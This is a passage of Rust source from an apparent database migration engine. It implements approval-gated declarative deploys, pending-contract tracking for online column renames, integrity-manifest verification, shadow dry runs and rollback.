                        table, from, to, ty,
                    } = &rename.intent;
                    let pending_version = rename.trigger_version.as_str().to_string();
                    // The rename's PLAN-GROUP version — the stable identity the
                    // SUPPLIED set / `depends_on` key on for orphan/blocked (§2.0.3
                    // item 3 / §2.0.4). It is E1's deterministic id (the
                    // `PgExpandContract` plan anchors its plan version on E1, see
                    // `render::lower::plan_step_version`). Deterministic per rename
                    // (§2.0.1), so a re-lowered IR reproduces it — which is exactly
                    // what `status` re-derives from the supplied set to decide
                    // orphan/present. Fail closed if the author somehow produced an
                    // empty expand chain (an internal invariant violation): fall back
                    // to the pending_version so the obligation still records SOME
                    // stable key rather than panicking the deploy.
                    let plan_version = rename
                        .expand
                        .first()
                        .map_or_else(|| pending_version.clone(), |e1| e1.version.as_str().to_string());
                    let already_outstanding = outstanding
                        .iter()
                        .any(|pc| pc.pending_version == pending_version)
                        // Also skip if an EARLIER step in THIS deploy already recorded
                        // the same deterministic pending_version (LOW — avoid a
                        // duplicate `pending` row from two same-version EXPAND steps in
                        // one deploy; net state was already correct via DISTINCT ON).
                        || recorded_this_deploy.contains(&pending_version);
                    if !already_outstanding {
                        let contract_versions: Vec<String> = rename
                            .contract
                            .iter()
                            .map(|m| m.version.as_str().to_string())
                            .collect();
                        // PR9e — write the obligation AND, when this is a deploy with a
                        // recovery scope, its `in_progress` recovery marker in ONE
                        // transaction (engine-stamped, atomic). Every outstanding
                        // obligation then ALWAYS has a marker — closing the
                        // obligation-vs-marker crash window structurally. `None` on the
                        // routine path is identical to the pre-PR9e single autocommit
                        // INSERT.
                        if let Some(pending_contracts) = backend.pending_contracts() {
                            pending_contracts
                                .record_pending_contract_with_recovery(
                                    exec_cfg,
                                    crate::apply::journal::PendingContractRecord {
                                        table,
                                        from_col: from,
                                        to_col: to,
                                        ty,
                                        pending_version: &pending_version,
                                        plan_version: &plan_version,
                                        contract_versions: &contract_versions,
                                        by: applied_by,
                                    },
                                    recovery_scope.copied(),
                                )
                                .await
                                .map_err(|e| EngineError::Apply(ApplyError::Journal(e)))?;
                            recorded_this_deploy.insert(pending_version.clone());
                        }
                        // PR9d MED — surface the FULL obligation descriptor so the
                        // control loop's same-deploy recovery can re-author its abort
                        // from these exact identity facts (table/from/to/ty + versions),
                        // never a second journal read.
                        opened_obligations.push(crate::apply::journal::PendingContract {
                            table: (*table).clone(),
                            from_col: (*from).clone(),
                            to_col: (*to).clone(),
                            ty: (*ty).clone(),
                            pending_version: pending_version.clone(),
                            plan_version: plan_version.clone(),
                            contract_versions,
                        });
                    }
                    i += 1;
                }
                PlanStep::Backfill(spec) => {
                    let outcome = backend
                        .run_backfill_step(exec_cfg, spec, approval, scope, applied_by, next_lock)
                        .await
                        .map_err(EngineError::Apply)?;
                    applied.applied.extend(outcome.applied);
                    applied.skipped.extend(outcome.skipped);
                    applied.recovered.extend(outcome.recovered);
                    i += 1;
                }
                PlanStep::Dml {
                    version,
                    name,
                    template,
                    binds,
                    destructive,
                    owner_app,
                    ..
                } => {
                    // **Destructive-DML approval gate (§2.1.1).** A destructive DML
                    // (a `delete`) needs explicit approval, mirroring the per-Migration
                    // gate the DDL spine runs in `apply_with_lock_backend`. We wire the
                    // step's own destructiveness via `PlanStep::is_destructive()` (its
                    // sole live call site) and refuse BEFORE the executor runs the
                    // template, so a destructive DML applies NOTHING under
                    // `Approval::None`. The DDL spine is gated downstream; the
                    // `OnlineRename(SqliteRebuild)` arm above is gated likewise; this
                    // closes the same hole for the net-new DML surface PR6a builds on.
                    // The executor-layer `run_dml_step` re-runs this gate as defense
                    // in depth.
                    if steps[i].is_destructive() && approval != Approval::Approved {
                        return Err(DeclarativeApplyError::Plain(
                            EngineError::ApprovalRequired,
                        ));
                    }
                    // **PR9b per-version scope (anti-bypass).** A destructive DML (a
                    // `delete`) under `ApprovalScope::Versions` runs ONLY if the
                    // operator individually reviewed its version-id. `All` ⇒ vacuously
                    // true (byte-identical to pre-PR9b). Fail-closed.
                    if steps[i].is_destructive() && !scope.admits(version.as_str()) {
                        return Err(DeclarativeApplyError::Plain(
                            EngineError::ApprovalNotScoped {
                                version: version.as_str().to_string(),
                            },
                        ));
                    }
                    let ran = backend
                        .run_dml_step(
                            exec_cfg, version, name, template, binds, *destructive, owner_app,
                            approval, scope, applied_by, next_lock,
                        )
                        .await
                        .map_err(EngineError::Apply)?;
                    if ran {
                        applied.applied.push(version.as_str().to_string());
                    } else {
                        applied.skipped.push(version.as_str().to_string());
                    }
                    i += 1;
                }
            }
        }

        // **§2.0.3 item 1 — DISCHARGE the obligations this deploy's contract-apply
        // completed.** All steps applied successfully, so for every obligation whose
        // C1/C2 this deploy carried (recognized in the read-back above), APPEND a
        // `resolved='applied'` row (append-only — the `pending` row is never edited),
        // so a later deploy reads the obligation as discharged and no longer refuses
        // the table. This is the routine deploy-N+1 contract-apply path (§2.0.2); the
        // `resolve-pending --apply` CLI is the operator's manual equivalent.
        if let Some(pending_contracts) = backend.pending_contracts() {
            for pc in &discharging {
                pending_contracts
                    .resolve_pending_contract(
                        exec_cfg,
                        pc,
                        crate::apply::journal::Resolution::Applied,
                        applied_by,
                    )
                    .await
                    .map_err(|e| EngineError::Apply(ApplyError::Journal(e)))?;
            }
        }

        // **§2.0.3 — EXPLICIT resolution (the `resolve-pending` path).** All steps
        // applied successfully, so discharge each caller-named obligation with its
        // chosen resolution (`applied`/`aborted`). Resolve-AFTER-apply (inside the
        // held lock) is fail-closed: an apply failure above returned early, leaving
        // the obligation OUTSTANDING — never a resolved-but-not-applied fail-open.
        if let Some(pending_contracts) = backend.pending_contracts() {
            for (pc, resolution) in explicit_resolve {
                pending_contracts
                    .resolve_pending_contract(exec_cfg, pc, *resolution, applied_by)
                    .await
                    .map_err(|e| EngineError::Apply(ApplyError::Journal(e)))?;
            }
        }

        Ok(DeclarativeDeployOutcome {
            applied,
            pending_contract,
            opened_obligations,
        })
    }

    /// Apply a plan through the gate (design §1.6).
    ///
    /// The gate, in order:
    /// 1. if [`MigrationPlan::denied`] is non-empty ⇒ [`EngineError::Denied`]
    ///    (never apply — a denied batch applies *nothing*);
    /// 2. if [`MigrationPlan::requires_approval`] and `approval != Approved` ⇒
    ///    [`EngineError::ApprovalRequired`] (nothing applied);
    /// 3. otherwise delegate to [`executor::apply`](crate::apply::executor::apply),
    ///    which **independently re-runs the guard** over every pending `up` and
    ///    runs the DDL under the least-privilege `migrator` role — defense in
    ///    depth, not bypassed by this gate.
    ///
    /// `applied_by` is the actor recorded in the journal (`app/actor/AI`).
    ///
    /// # Errors
    /// - [`EngineError::Denied`] — the plan had guard denials.
    /// - [`EngineError::ApprovalRequired`] — destructive plan without approval.
    /// - [`EngineError::Apply`] — the executor failed (incl. its own guard
    ///   re-check, checksum drift, or a mid-apply DB error).
    pub async fn apply<B: MigrationBackend>(
        &self,
        plan: &MigrationPlan,
        approval: Approval,
        backend: &B,
        exec_cfg: &ExecutorConfig,
        applied_by: &str,
    ) -> Result<ApplyOutcome, EngineError> {
        // Standalone caller: the executor acquires + releases the project lock.
        // PR9b: blanket scope — the routine `apply` surface has no per-version review
        // set; the scoped surface is `apply_verified_scoped`.
        self.apply_inner(
            plan,
            approval,
            &crate::approval::ApprovalScope::All,
            backend,
            exec_cfg,
            applied_by,
            LockMode::Acquire,
        )
        .await
    }

    /// [`apply`](Self::apply) with an explicit [`LockMode`] (H10 mechanism).
    ///
    /// Public peer of [`apply`](Self::apply) for an OUTER caller that already
    /// holds the project advisory lock on `conn` (e.g. the submission adapter,
    /// which acquires the lock around dedup-read → apply to close the
    /// concurrent-double-apply window, HIGH-1). Such a caller passes
    /// [`LockMode::AlreadyHeld`] so the executor does NOT re-acquire / re-release
    /// the lock it does not own; the outer caller is responsible for releasing it
    /// on every exit path. The denial / approval gate runs identically in both
    /// modes.
    ///
    /// # Errors
    /// Same as [`apply`](Self::apply).
    pub async fn apply_with_lock<B: MigrationBackend>(
        &self,
        plan: &MigrationPlan,
        approval: Approval,
        backend: &B,
        exec_cfg: &ExecutorConfig,
        applied_by: &str,
        lock_mode: LockMode,
    ) -> Result<ApplyOutcome, EngineError> {
        self.apply_inner(
            plan,
            approval,
            &crate::approval::ApprovalScope::All,
            backend,
            exec_cfg,
            applied_by,
            lock_mode,
        )
        .await
    }

    /// [`apply`](Self::apply) with an explicit [`LockMode`] (H10).
    ///
    /// `LockMode::Acquire` is the standalone path (the executor takes the project
    /// advisory lock per batch). `LockMode::AlreadyHeld` is the declarative path:
    /// [`apply_declarative`](Self::apply_declarative) holds the lock for the whole
    /// deploy, so the inner plain-set apply must NOT re-acquire/re-release it.
    ///
    /// The denial / approval gate runs identically in both modes — an early gate
    /// rejection under `AlreadyHeld` returns without touching the lock (the outer
    /// `apply_declarative` still releases it), so the lock is never leaked.
    // Eight cohesive apply parameters (plan + approval/scope + backend/cfg +
    // attribution + lock-mode), each a distinct concern read independently in the
    // body; bundling them into a params struct would be a pure-shuffle refactor
    // with no readability gain and risks the behavior change this hygiene pass
    // forbids. Private method, 3 in-crate callers.
    #[allow(clippy::too_many_arguments)]
    async fn apply_inner<B: MigrationBackend>(
        &self,
        plan: &MigrationPlan,
        approval: Approval,
        scope: &crate::approval::ApprovalScope,
        backend: &B,
        exec_cfg: &ExecutorConfig,
        applied_by: &str,
        lock_mode: LockMode,
    ) -> Result<ApplyOutcome, EngineError> {
        // Gate 1: a denied plan can never be applied.
        if !plan.denied.is_empty() {
            return Err(EngineError::Denied(plan.denied.clone()));
        }
        // Gate 2: destructive plans need explicit approval.
        if plan.requires_approval && approval != Approval::Approved {
            return Err(EngineError::ApprovalRequired);
        }
        // Gate 3: delegate to the executor, which re-runs the guard + role
        // (defense in depth). Reconstruct the migration set from the plan's
        // passing items (denied is empty here, so items == the full input set).
        let migrations: Vec<Migration> =
            plan.items.iter().map(|p| p.migration.clone()).collect();
        // Forward the approval decision: the executor re-runs its OWN destructive
        // gate (defense in depth — design §1.6), so the gate here is additional,
        // not a replacement.
        //
        // P6a — call the dialect-generic `apply_with_lock_backend` (already generic
        // since P1) with the supplied backend, instead of the PG-`&Client`-typed
        // `executor::apply_with_lock`. For the PG backend this is byte-identical:
        // `executor::apply_with_lock` itself just constructs `PostgresBackend::new`
        // and calls `apply_with_lock_backend`, so going straight through the backend
        // is the same code path (the guard re-run, least-privilege role, GUC hygiene,
        // and the H10 lock-mode discipline are all inside `apply_with_lock_backend`).
        // PR9b: thread the caller's per-version `scope` into the executor gate. The
        // routine flat `apply`/`apply_with_lock` callers pass `ApprovalScope::All`
        // (byte-identical to pre-PR9b); the out-of-band approved `.sql` deploy surface
        // (`apply_verified_scoped`) passes the operator's reviewed version set so a
        // co-bundled destructive `.sql` migration outside the set is refused.
        let outcome = executor::apply_with_lock_backend(
            backend,
            exec_cfg,
            &migrations,
            approval,
            scope,
            applied_by,
            lock_mode,
        )
        .await?;
        Ok(outcome)
    }

    /// Apply a migration set, **verifying its set-level integrity manifest first**
    /// (v3 Plan F — the pre-apply gate).
    ///
    /// This is the trusted-deploy entry point. Before ANY apply work — before the
    /// guard/approval gate, before [`executor::apply`](crate::apply::executor::apply)
    /// acquires the project advisory lock, before a single statement of DDL runs —
    /// it recomputes the integrity manifest over the SUPPLIED `migrations` (in the
    /// given order) and compares it to `expected`:
    ///
    /// - `Some(expected)` ⇒ **verify-then-apply.** A mismatch (the bundle was
    ///   reordered / content-edited / inserted-into / removed-from relative to the
    ///   trusted manifest) returns [`EngineError::Manifest`] and applies NOTHING —
    ///   no lock taken, no journal touched, no DDL run. A match falls through to
    ///   the normal gated [`apply`](Self::apply).
    /// - `None` ⇒ **apply unverified.** For internal callers that have no manifest
    ///   to check against (e.g. a freshly-authored in-process set that never left
    ///   the trust boundary). Identical to calling [`apply`](Self::apply) directly.
    ///
    /// # Order matters: verify BEFORE the lock
    ///
    /// The verification runs in THIS method, before `apply` (and therefore before
    /// `executor::apply`'s `pg_advisory_lock`). A tampered set is rejected without
    /// ever contending for the lock or opening a transaction — the gate cannot be
    /// raced past, and a refusal leaves the database and journal completely
    /// untouched.
    ///
    /// # Trust model — caller contract
    ///
    /// `expected` MUST be supplied by a **trusted** source: the control plane,
    /// which stamps the [`ManifestHash`] at build / review time and holds it
    /// out-of-band. It MUST NOT be read from the same bundle `migrations` arrived
    /// in — an attacker who can edit the migrations can equally edit a hash
    /// shipped alongside them, and the check would then verify a tampered set
    /// against its own tampered hash (vacuously passing). The manifest is a check
    /// of *the bundle* against *an independently-held expectation*. See
    /// [`crate::plan::manifest`].
    ///
    /// # What set is verified — the RAW supplied set, before any filtering (M1)
    ///
    /// The manifest is verified over the RAW `migrations` slice the caller
    /// supplied — the exact input membership/content the control plane stamped at
    /// review time — **before** [`plan`](Self::plan) runs the guard. This is
    /// deliberate: verifying the post-`plan` `items` would let a guard *denial*
    /// (or any future `plan()`-time filtering) silently SHRINK the verified set, so
    /// the integrity check would pass over a strict subset of the stamped bundle. By
    /// verifying input membership independently of guard filtering, a removed or
    /// inserted migration is always caught against the stamp.
    ///
    /// A guard-denied migration is still PART of the verified set (so the manifest
    /// matches the stamp), and is then refused by the *separate, correct* denial
    /// gate inside [`apply`](Self::apply) ([`EngineError::Denied`]) — a denial and a
    /// manifest mismatch are orthogonal failures, surfaced as orthogonal errors.
    ///
    /// # Errors
    /// - [`EngineError::Manifest`] — the raw supplied set did not match `expected`
    ///   (only possible when `expected` is `Some`). Refused before the
    ///   plan/gate/lock/DDL; nothing applied.
    /// - [`EngineError::Denied`] / [`EngineError::ApprovalRequired`] /
    ///   [`EngineError::Apply`] — the same gate + executor errors as
    ///   [`apply`](Self::apply), after a successful (or skipped) manifest check.
    // M1: takes the RAW supplied set + the guard config (to plan internally) so
    // verification happens over the input membership BEFORE plan()/guard filtering.
    // Eight distinct, irreducible inputs (raw set, guard cfg, expected hash,
    // approval, conn, exec cfg, actor) — each is load-bearing; bundling them into a
    // struct would only obscure the trusted-deploy call shape.
    #[allow(clippy::too_many_arguments)]
    pub async fn apply_verified<B: MigrationBackend>(
        &self,
        migrations: &[Migration],
        guard_cfg: &GuardConfig,
        expected: Option<&ManifestHash>,
        approval: Approval,
        backend: &B,
        exec_cfg: &ExecutorConfig,
        applied_by: &str,
    ) -> Result<ApplyOutcome, EngineError> {
        // Pre-apply manifest gate (v3 Plan F, M1): recompute over the RAW supplied
        // set — the input membership/content the control plane stamped — BEFORE
        // plan()/guard filtering and before the gate / lock / any DDL. Verifying
        // the raw input (not the post-plan `items`) means a guard denial or any
        // future plan-time filtering cannot silently shrink the verified set. The
        // manifest covers every migration's (version, checksum) folded in canonical
        // executed order, so a reorder / edit / insertion / removal is caught here.
        if let Some(expected) = expected {
            verify_manifest(migrations, expected)?;
        }
        // Verified (or unverified by caller choice) ⇒ plan (guard lint) then the
        // normal gated apply, which re-runs the denial/approval gate and then the
        // executor (guard + role + advisory lock). A guard-denied migration was
        // still part of the verified set above; the denial is surfaced HERE by the
        // gate (EngineError::Denied), independent of the manifest check. The lock is
        // only ever taken AFTER the manifest passes.
        let plan = self.plan(migrations, guard_cfg);
        self.apply(&plan, approval, backend, exec_cfg, applied_by).await
    }

    /// **PR9b** — as [`apply_verified`](Self::apply_verified), but threads a
    /// per-version [`ApprovalScope`](crate::ApprovalScope) so the out-of-band approved
    /// `.sql` deploy surface fail-closed REFUSES a co-bundled destructive `.sql`
    /// migration whose version-id the operator did not individually review, even under
    /// [`Approval::Approved`]. `apply_verified` itself stays blanket
    /// ([`ApprovalScope::All`](crate::ApprovalScope::All)) for its existing trusted
    /// callers.
    ///
    /// # Errors
    /// Same as [`apply_verified`](Self::apply_verified), plus
    /// [`EngineError::ApprovalNotScoped`] when a destructive migration's version is
    /// outside `scope`.
    #[allow(clippy::too_many_arguments)]
    pub async fn apply_verified_scoped<B: MigrationBackend>(
        &self,
        migrations: &[Migration],
        guard_cfg: &GuardConfig,
        expected: Option<&ManifestHash>,
        approval: Approval,
        scope: &crate::approval::ApprovalScope,
        backend: &B,
        exec_cfg: &ExecutorConfig,
        applied_by: &str,
    ) -> Result<ApplyOutcome, EngineError> {
        if let Some(expected) = expected {
            verify_manifest(migrations, expected)?;
        }
        let plan = self.plan(migrations, guard_cfg);
        self.apply_inner(
            &plan,
            approval,
            scope,
            backend,
            exec_cfg,
            applied_by,
            LockMode::Acquire,
        )
        .await
    }

    /// Dry-run a migration batch against a throwaway **shadow DATABASE** clone
    /// (v3 Plan C) — routed through the backend's
    /// [`ShadowDryRun`](crate::apply::backend::ShadowDryRun) capability (C3).
    ///
    /// Previews the FULL batch against a faithful copy (same `project_schema`
    /// name, confined migrator role, the UNMODIFIED [`executor::apply`] path)
    /// without ever touching the real project DB, then tears the clone down on
    /// every path. The control plane decides WHEN to require a dry-run (the
    /// recommendation is mandatory for destructive / AI-authored sets); this
    /// method is the primitive.
    ///
    /// The dry-run goes through [`backend.shadow()`](crate::apply::backend::MigrationBackend::shadow)
    /// rather than a raw `&Client`, so no PG-driver type appears on this surface.
    /// A backend with no shadow capability (e.g. SQLite — its DDL is trusted +
    /// dev-recoverable) yields the explicit
    /// [`DryRunError::ShadowUnsupported`](crate::apply::backend::DryRunError::ShadowUnsupported),
    /// NOT a false-success report: the caller must never believe a dry-run happened
    /// when it did not.
    ///
    /// # Errors
    /// - [`crate::apply::backend::DryRunError::ShadowUnsupported`] — the backend has no
    ///   shadow dry-run capability.
    /// - other [`crate::apply::backend::DryRunError`] — a harness failure (CREATE/DROP
    ///   DATABASE, the shadow connection, role provisioning). A *migration* failing
    ///   is not an error — it is reported in the [`crate::apply::backend::DryRunReport`].
    pub async fn dry_run<B: MigrationBackend>(
        &self,
        backend: &B,
        migrations: &[Migration],
        exec_cfg: &ExecutorConfig,
        shadow_cfg: &crate::apply::backend::ShadowConfig,
        applied_by: &str,
    ) -> Result<crate::apply::backend::DryRunReport, crate::apply::backend::DryRunError> {
        let Some(shadow) = backend.shadow() else {
            return Err(crate::apply::backend::DryRunError::ShadowUnsupported);
        };
        shadow
            .dry_run(migrations, exec_cfg, shadow_cfg, applied_by)
            .await
    }

    /// Dry-run a DECLARATIVE deploy plan against a shadow DATABASE, validating
    /// the resulting schema against the desired snapshot (v3 Plan C, Phase 2) —
    /// routed through the backend's [`ShadowDryRun`](crate::apply::backend::ShadowDryRun)
    /// capability (C3).
    ///
    /// Like [`dry_run`](Self::dry_run), a backend with no shadow capability yields
    /// the explicit [`DryRunError::ShadowUnsupported`](crate::apply::backend::DryRunError::ShadowUnsupported),
    /// never a false-success report.
    ///
    /// # Errors
    /// - [`crate::apply::backend::DryRunError::ShadowUnsupported`] — the backend has no
    ///   shadow dry-run capability.
    /// - other [`crate::apply::backend::DryRunError`] — a harness failure.
    pub async fn dry_run_declarative<B: MigrationBackend>(
        &self,
        backend: &B,
        plan: &DeclarativeDeployPlan,
        desired: &crate::render::declarative::DesiredSchema,
        exec_cfg: &ExecutorConfig,
        shadow_cfg: &crate::apply::backend::ShadowConfig,
        applied_by: &str,
    ) -> Result<crate::apply::backend::DryRunReport, crate::apply::backend::DryRunError> {
        let Some(shadow) = backend.shadow() else {
            return Err(crate::apply::backend::DryRunError::ShadowUnsupported);
        };
        shadow
            .dry_run_declarative(plan, desired, exec_cfg, shadow_cfg, applied_by)
            .await
    }

    /// Roll back applied migrations to a [`crate::apply::executor::RollbackTarget`] through the gate
    /// (design §5).
    ///
    /// A `down` is privileged SQL that typically **reverses** schema (drops the
    /// objects an `up` created), so rollback is treated as destructive: it
    /// **requires [`Approval::Approved`]** — the AI never auto-rolls-back. Given
    /// approval, it delegates to [`executor::rollback`](crate::apply::executor::rollback),
    /// which **independently** runs every `down` through the guard and under the
    /// least-privilege `migrator` role (defense in depth, identical to the up
    /// path), refuses to cross an irreversible (`down: None`) migration unless
    /// `request.options.force` + `request.options.backup_acknowledged`, and
    /// journals each rollback as an append-only `rolled_back` event.
    ///
    /// `applied_by` is the actor recorded in the journal.
    ///
    /// # Errors
    /// - [`RollbackEngineError::ApprovalRequired`] — `approval != Approved`.
    /// - [`RollbackEngineError::Rollback`] — the executor's rollback failed
    ///   (guard denial on a `down`, irreversible without force, checksum drift,
    ///   missing-from-set, unknown target, or a mid-rollback DB error).
    #[cfg(feature = "native-pg")]
    pub async fn rollback(
        &self,
        migrations: &[Migration],
        request: RollbackRequest,
        approval: Approval,
        conn: &Client,
        exec_cfg: &ExecutorConfig,
        applied_by: &str,
    ) -> Result<RollbackOutcome, RollbackEngineError> {
        // Gate: rollback is destructive ⇒ explicit approval required.
        if approval != Approval::Approved {
            return Err(RollbackEngineError::ApprovalRequired);
        }
        // Forward the approval decision: the executor re-runs its OWN approval
        // gate (defense in depth — design §1.6), so the gate here is additional,
        // not a replacement.
        let outcome =
            executor::rollback(conn, exec_cfg, migrations, request, approval, applied_by).await?;
        Ok(outcome)
    }

    /// Orchestrate the EXPAND phase of an online expand-contract migration
    /// (Plan 8 v1.3): apply the additive + dual-write steps, run the backfill,
    /// then journal the backfill step's completion — in that order, so the
    /// v1.2 gate's single source of truth (the journal) only shows the expand as
    /// fully done **after the data is actually mirrored**.
    ///
    /// The sequence is deliberately NOT "apply all of `plan.expand` then
    /// backfill": E3 (the backfill-marker migration) must be journaled **after**
    /// [`run_backfill`](crate::apply::backend::postgres::backfill::run_backfill) succeeds, never before —
    /// otherwise the gate would let the destructive `DROP COLUMN` (which
    /// `depends_on` E3) run while pre-existing rows are still un-mirrored, losing
    /// data. So:
    ///
    /// 1. apply E1 (`ADD COLUMN`) + E2 (`CREATE FUNCTION`/`TRIGGER`) — the
    ///    dual-write trigger is now live, so every concurrent write mirrors;
    /// 2. [`run_backfill`](crate::apply::backend::postgres::backfill::run_backfill) mirrors the pre-existing rows (`<to> := <from>` paged
    ///    on the PK), resumable, bounded — the trigger covers anything written
    ///    during it;
    /// 3. apply E3 (the no-op backfill marker) — this records the backfill's
    ///    completion in the journal, so the gate now sees the expand complete.
    ///
    /// E1+E2 and E3 each go through [`apply`](crate::apply::executor::apply) (guard +
    /// least-privilege role + journal), and the backfill goes through its own
    /// guarded, role-bracketed batches. `approval` must be
    /// [`Approval::Approved`] (the backfill mutates data).
    ///
    /// # Errors
    /// - [`OnlineError::Approval`] — `approval != Approved`.
    /// - [`OnlineError::Apply`] — applying E1/E2 or the E3 marker failed.
    /// - [`OnlineError::Backfill`] — the backfill failed (E3 is NOT journaled, so
    ///   the gate keeps the expand incomplete and the contract stays blocked; the
    ///   backfill is resumable on a re-run).
    #[cfg(feature = "native-pg")]
    pub async fn run_expand(
        &self,
        plan: &crate::render::expand_contract::ExpandContractPlan,
        approval: Approval,
        conn: &Client,
        exec_cfg: &ExecutorConfig,
        applied_by: &str,
    ) -> Result<ApplyOutcome, OnlineError> {
        // Standalone caller: each E1+E2 / E3 apply takes the project lock itself.
        self.run_expand_with_lock(plan, approval, conn, exec_cfg, applied_by, LockMode::Acquire)
            .await
    }

    /// [`run_expand`](Self::run_expand) with an explicit [`LockMode`] (H10).
    ///
    /// `LockMode::Acquire` is the standalone path (each inner E1+E2 / E3 apply
    /// takes + releases the project lock). `LockMode::AlreadyHeld` is the
    /// declarative path: [`apply_declarative`](Self::apply_declarative) holds the
    /// project advisory lock for the whole deploy, so each inner apply here must
    /// NOT re-acquire/re-release it.
    ///
    /// The backfill ([`run_backfill`](crate::apply::backend::postgres::backfill::run_backfill)) is
    /// unaffected by the mode: it uses a per-batch **transaction-scoped**
    /// `pg_advisory_xact_lock`, which is re-entrant within the session that
    /// already holds the session-scoped project lock (it succeeds immediately and
    /// auto-releases at each batch COMMIT), while a SECOND connection still blocks
    /// on the held session lock. So the whole-deploy serialization is preserved
    /// through the backfill too, without ever freeing the project lock.
    #[cfg(feature = "native-pg")]
    async fn run_expand_with_lock(
        &self,
        plan: &crate::render::expand_contract::ExpandContractPlan,
        approval: Approval,
        conn: &Client,
        exec_cfg: &ExecutorConfig,
        applied_by: &str,
        lock_mode: LockMode,
    ) -> Result<ApplyOutcome, OnlineError> {
        // The E1+E2 → backfill → E3-journaled-LAST sequence lives in ONE place
        // ([`run_expand_pg`](crate::apply::backend::postgres::online::run_expand_pg)) so the public
        // `&Client` API here and the [`PgOnline`](crate::apply::backend::postgres::online::PgOnline)
        // capability seam share byte-identical behavior (M3).
        // The standalone `run_expand` is a TRUSTED single-actor surface (the same
        // posture as the dev CLI `--yes` / rollback), so it passes
        // [`ApprovalScope::All`] — the EXPAND's per-version scope is enforced
        // (fail-closed) only on the new out-of-band approved-apply path, which drives
        // the engine's declarative spine with an explicit `Versions` scope (PR9b).
        crate::apply::backend::postgres::online::run_expand_pg(
            conn,
            &plan.expand,
            &plan.backfill,
            approval,
            &crate::approval::ApprovalScope::All,
            // PR9c LOW (i): the standalone trusted surface threads the plan's E2
            // `trigger_version` so the now-unconditional scope gate resolves a key even
            // if `plan.expand` is empty. Under `ApprovalScope::All` the gate is vacuously
            // true; the version is consulted only by the `Versions` fail-closed arm.
            &plan.trigger_version,
            exec_cfg,
            applied_by,
            lock_mode,
        )
        .await
    }
}

/// **PR9b L1 / PR9c — the SHARED contract-apply recognizer.** Decide whether a
/// deploy whose `Ddl` steps carry `ddl_up_by_version` (version → `up` SQL) is the
/// LEGITIMATE contract-apply for the outstanding obligation `pc` — i.e. whether
/// it RE-PRESENTS the obligation's recorded C1/C2 with the SAME re-authored `up`
/// SQL (re-author-compare, NOT a version-id match alone). Fail-CLOSED: an empty
/// `contract_versions`, a missing/ mismatched discharging Ddl step, a length
/// mismatch, or an author error all return `false` (⇒ NOT a contract-apply ⇒ the
/// obligation stays gated).
///
/// This is the SINGLE source of truth for that decision, shared by:
///   • the APPLY-time interlock loop in
///     [`apply_plan_resolving`](MigrationEngine::apply_plan_resolving), and
///   • the control-plane PRE-APPLY bundle interlock gate (PR9c HIGH/MED — refuse a
///     multi-file approved bundle BEFORE any earlier file's online-rename EXPAND can
///     commit ahead of a guaranteed-later interlock refusal).
///
/// Keeping ONE recognizer means the pre-check and the apply can never drift: a
/// bundle the pre-check would refuse is exactly one the apply loop would refuse,
/// and a legitimate contract-apply both exempt.
#[must_use]
pub fn recognizes_contract_apply(
    project_schema: &str,
    pc: &crate::apply::journal::PendingContract,
    ddl_up_by_version: &std::collections::BTreeMap<&str, &str>,
) -> bool {
    if pc.contract_versions.is_empty() {
        return false;
    }
    // Re-author deterministically from the obligation's stored identity facts (the
    // SAME re-author `command::runner` does at `resolve-pending`). The
    // `owner_app` does not affect the contract `up` text, so any stable value is
    // fine for the comparison.
    let author = crate::render::expand_contract::ExpandContractAuthor::new(
        project_schema.to_string(),
        "discharge-recognize",
    );
    let Ok(plan) = author.author(&crate::render::expand_contract::OnlineIntent::RenameColumn {
        table: pc.table.clone(),
        from: pc.from_col.clone(),
        to: pc.to_col.clone(),
        ty: pc.ty.clone(),
    }) else {
        return false;
    };
    if pc.contract_versions.len() != plan.contract.len() {
        return false;
    }
    pc.contract_versions
        .iter()
        .zip(plan.contract.iter())
        .all(|(v, authored)| {
            ddl_up_by_version
                .get(v.as_str())
                .is_some_and(|up| *up == authored.up.as_str())
        })
}

/// The structured result of [`MigrationEngine::plan_declarative`].
///
/// It holds the linted **plain** plan plus the online **renames**, kept SEPARATE
/// (C1: a rename is a multi-deploy op and must not be flattened into the plain
/// set).
#[derive(Debug, Clone)]
pub struct DeclarativeDeployPlan {
    /// The plain additive / destructive migrations, already linted by the guard
    /// (denial / destructive / approval summary), ready for the gated
    /// [`apply`](MigrationEngine::apply).
    pub plain: MigrationPlan,
    /// The online renames, each a full
    /// [`ExpandContractPlan`](crate::render::expand_contract::ExpandContractPlan)
    /// (expand migs + `BackfillSpec` + contract migs). Driven through
    /// [`run_expand`](MigrationEngine::run_expand), NOT the plain `apply`.
    ///
    /// ALWAYS empty on the SQLite dialect: a SQLite declarative rename is routed to a
    /// [`rebuilds`](Self::rebuilds) entry (an offline rebuild copying `to ← from`),
    /// never expand-contract — so [`run_expand`](MigrationEngine::run_expand) is never
    /// reached on a SQLite backend (P6a CONDITION ii / H1).
    pub renames: Vec<crate::render::expand_contract::ExpandContractPlan>,
    /// **P6a (SQLite only)** — the existing-table changes SQLite has no native
    /// `ALTER` for (type / nullability change, column rename, ADD/DROP CONSTRAINT,
    /// FK redefinition), each a structured 12-step table rebuild
    /// ([`SqliteRebuild`](crate::render::declarative::SqliteRebuild)). Driven through
    /// [`MigrationBackend::rebuild_one`](crate::apply::backend::MigrationBackend::rebuild_one)
    /// by [`apply_declarative`](MigrationEngine::apply_declarative), under the
    /// destructive/approval gate (the paired migration is `destructive +
    /// requires_approval`). ALWAYS empty on the PG dialect.
    pub rebuilds: Vec<crate::render::declarative::SqliteRebuild>,
}

impl DeclarativeDeployPlan {
    /// The plan's **full effective migration set** — every migration the deploy
    /// will execute (across all of its deploys), in apply order.
    ///
    /// It is the plain migrations ([`plain.items`](MigrationPlan::items) → their
    /// `migration`s, in order) PLUS, for each rename in
    /// [`renames`](Self::renames), that rename's expand migrations AND its
    /// (deferred) contract migrations — i.e. each rename's full
    /// [`ExpandContractPlan::all`](crate::render::expand_contract::ExpandContractPlan::all)
    /// (expand then contract). This is the SET the integrity manifest is computed
    /// over: a declarative deploy applies the plain set + every rename's expand at
    /// deploy N and the renames' contract at deploy N+1, so the stamp must cover
    /// the contract too even though it lands later.
    ///
    /// The SLICE order here is cosmetic: [`compute_manifest`] re-sorts into the
    /// canonical executed order before folding, so the manifest is invariant to
    /// how this set is sliced (M2) and stable for a given generated plan instance.
    #[must_use]
    pub fn effective_set(&self) -> Vec<Migration> {
        let mut set: Vec<Migration> =
            self.plain.items.iter().map(|p| p.migration.clone()).collect();
        for rename in &self.renames {
            set.extend(rename.all());
        }
